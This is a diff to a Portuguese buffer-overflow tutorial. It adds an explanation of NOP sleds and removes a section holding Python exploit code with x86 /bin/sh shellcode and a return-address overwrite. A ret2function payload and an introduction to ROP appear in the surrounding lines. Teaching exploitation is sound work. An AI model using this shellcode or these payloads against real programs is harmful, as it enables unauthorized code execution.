@@ -204,6 +204,7 @@ A linha `padding = b"\x90" * (64 - len(shellcode))` é utilizada para criar uma 
 5. **`b"\x90" * (64 - len(shellcode))`**:
    - Cria uma sequência de NOPs que preenche o espaço restante no buffer, ou seja, 40 bytes de NOPs (`\x90`), neste exemplo. Isso garante que o shellcode será executado corretamente, mesmo que o endereço exato de início da execução seja um pouco antes do shellcode.
 
+Isto é, suponha que o shellcode tenha 20 bytes. O buffer tem 64 bytes. O restante, 44 bytes (64 - 20), será preenchido com NOPs. Isso significa que o exploit poderá redirecionar a execução para qualquer byte dentro desses 44 bytes de NOPs e ainda assim alcançar o shellcode, aumentando a chance de sucesso. Em resumo a linha **padding = b"\x90" * (64 - len(shellcode))** cria um "sled" de NOPs que preenche o buffer vulnerável até o shellcode.
 
 Isso gerará um payload que pode ser passado para o programa vulnerável. Quando o programa retorna, ele executará o shellcode, abrindo um terminal.
 
@@ -251,40 +252,6 @@ payload += struct.pack("<I", secret_function_address)
 # Exibe o payload que deve ser passado para o programa vulnerável
 print(payload)
 ```
-
-### Shellcode
-Se o atacante não achar nem uma função que lhe é útil é possível usar um shellcode.
-```python
-import struct
-
-# Shellcode para abrir /bin/sh
-shellcode = (
-    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
-    b"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
-)
-
-# Substitua este endereço pelo endereço real do buff[64]
-buff_address = 0xffffd5f0  # Exemplo fictício
-
-# Montagem do payload
-padding = b"\x90" * (64 - len(shellcode))  # NOP sled para garantir que o shellcode seja alcançado
-payload = padding + shellcode  # Shellcode que será executado
-payload += struct.pack("<I", buff_address)  # Sobrescreve o endereço de retorno
-
-# Exibir o payload
-print(payload)
-```
-A seguinte abaixo faz o seguinte:
-1. **len(shellcode)**: Calcula o tamanho do shellcode em bytes.
-2. **(64 - len(shellcode))**: Calcula quantos bytes restam no buffer de 64 bytes depois de inserir o shellcode.
-3. **b"\x90" * (64 - len(shellcode))**: Cria uma sequência de bytes preenchida com instruções NOP para ocupar o espaço restante no buffer.
-```python
-padding = b'\x90' * (64 - len(shellcode))
-```
-Isto é, suponha que o shellcode tenha 20 bytes. O buffer tem 64 bytes. O restante, 44 bytes (64 - 20), será preenchido com NOPs. Isso significa que o exploit poderá redirecionar a execução para qualquer byte dentro desses 44 bytes de NOPs e ainda assim alcançar o shellcode, aumentando a chance de sucesso. Em resumo a linha **padding = b"\x90" * (64 - len(shellcode))** cria um "sled" de NOPs que preenche o buffer vulnerável até o shellcode.
-
-Porém normalmente não temos permissão de execução na pilha. O que pode ser feito ?
-
 ### Return-oriented programming
 A ideia do ROP é utilizar códigos já presentes no espaço de endereçamento do processo e que tem permissão de execução. Código presente no próprio programa ou em códigos de bibliotecas. Isso é realizado através da escolha de pedaços de códigos chamados "gadgets". Um getget é uma sequencia de instruções que são finalizadas com a instrução "ret".
 ![Um possível exemplo de ROP](https://github.com/user-attachments/assets/7bbc980e-1300-48f9-a7a9-f63e21b5edd8 "Exemplo de ROP").
